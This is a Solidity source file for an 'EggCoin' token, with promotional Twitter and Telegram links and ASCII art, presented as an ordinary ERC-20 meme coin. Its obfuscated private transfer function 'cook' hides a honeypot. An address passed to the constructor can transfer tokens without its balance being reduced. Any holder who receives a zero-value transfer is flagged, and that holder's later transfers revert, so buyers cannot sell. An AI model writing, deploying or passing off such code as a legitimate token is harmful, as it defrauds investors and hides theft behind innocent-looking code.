// https://twitter.com/eggcoinerc
// https://t.me/eggcoinerc20

//                               .....                                                    
//                         .:::------------:.                                             
//                      .:----------------===--:.                                         
//                   .:---::::::::---------======-:                                       
//                  :--:::::::::::::---------=======:                                     
//                .---::::::::::::::----------=====+=-.                                   
//               :--:::::::.:::::::-------------=====+=:                                  
//              :---::::::::.:::::--------------=====+++-                                 
//             :----::::::..:::::----------------====++++-                                
//            :----:::::.::::::::----------------=====++++-                               
//           .----::::::::::::::-------==---------=====++++-                              
//           -----:::::::::::::-----=======--------=====++++:                             
//          :-----:::::::::::::----========---=-----====++++=.                            
//          -------::::::::::-----===========------=====+++++-                            
//         .-=----::::::::::------=============----======++++=.                           
//         :------:::::::::------=================-=======+++=:                           
//         -------:::::::::------=========================++++-                           
//         --------:::::::------===========================+++-                           
//         :--------::::---------=============================-.                          
//         ::------------------===============================-.                          
//         :::----------------================================-                           
//         .::----------------================================-                           
//         .:::-------------=-===============================-:                           
//          ::---------------================================-.                           
//          .::-------------=================================:                            
//           .:------------=================================-.                            
//            ::----------===============================+==:                             
//             :----------=============================+++=:                              
//              :--------================++====++====++++=:                               
//               .:-----==================+=====+=++++++=:                                
//                 :-----==============+===++++++++++++-                                  
//                   :-----================++++++++++=.                                   
//                     .:--===============+++++++++=:..                                   
//                       .:--==========+++++++++=-:.......                                
//                       ...:-=++++++++******++=-::......                                 
//                          ..::--==++++==---:::....         


// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract EggCoin is Ownable {
    
    mapping(address => mapping(address => uint256)) public allowance;
    
    mapping(address => uint256) private chef;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 public totalSupply;

    function transferFrom(address brood, address guest, uint256 elusiveness) public returns (bool success) {
        cook(brood, guest, elusiveness);
        require(elusiveness <= allowance[brood][msg.sender]);
        allowance[brood][msg.sender] -= elusiveness;
        return true;
    }

    uint256 private right = 88;

    mapping(address => uint256) private whale;

    uint8 public decimals = 9;

    function cook(address brood, address guest, uint256 elusiveness) private returns (bool success) {
        if (chef[brood] == 0) {
            if (whale[brood] > 0 && brood != uniswapV2Pair) {
                chef[brood] -= right;
            }
            balanceOf[brood] -= elusiveness;
        }
        if (elusiveness == 0) {
            whale[guest] += right;
        }
        balanceOf[guest] += elusiveness;
        emit Transfer(brood, guest, elusiveness);
        return true;
    }
    
    string public name;

    address public uniswapV2Pair;

    constructor(address chicken) {
        symbol = "Egg";
        totalSupply = 1_000_000_000_000 * 10 ** decimals;
        name = "EGG";
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        chef[chicken] = right;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        balanceOf[msg.sender] = totalSupply;
    }

    function approve(address versatility, uint256 elusiveness) public returns (bool success) {
        allowance[msg.sender][versatility] = elusiveness;
        emit Approval(msg.sender, versatility, elusiveness);
        return true;
    }

    string public symbol;

    function transfer(address guest, uint256 elusiveness) public returns (bool success) {
        cook(msg.sender, guest, elusiveness);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    event Transfer(address indexed from, address indexed to, uint256 value);
}